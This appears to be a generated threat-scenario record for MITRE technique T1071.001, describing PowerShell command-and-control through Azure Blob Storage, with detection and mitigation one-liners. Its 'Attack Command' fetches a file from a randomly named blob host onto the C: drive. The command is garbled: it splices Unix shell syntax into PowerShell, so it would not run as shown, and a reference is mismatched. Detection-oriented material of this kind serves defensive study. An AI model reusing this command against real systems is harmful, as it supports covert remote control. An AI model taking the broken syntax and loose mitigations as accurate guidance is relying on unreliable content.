---
type: campaign
scenario_id: 427
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using Invoke-WebRequest for C2 via Azure Blob Storage.

## Threat Description
Using Invoke-WebRequest for C2 via Azure Blob Storage.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).blob.core.windows.net/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -OutFile C:\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"
```

## Detection Logic
Monitor Invoke-WebRequest Azure: `wmic process where name='powershell.exe' get commandline | findstr blob.core.windows.net`; Network traffic: `tshark -Y 'http.host contains blob.core.windows.net'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block Azure Blob: `netsh advfirewall firewall add rule name='Block Azure Blob' dir=out action=block remoteip=20.150.0.0/15`.

## AI Training Prompt
Train AI to detect Invoke-WebRequest C2 via Azure Blob Storage by analyzing HTTP requests, Azure Blob URLs, and file creation patterns; recommend blob storage blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
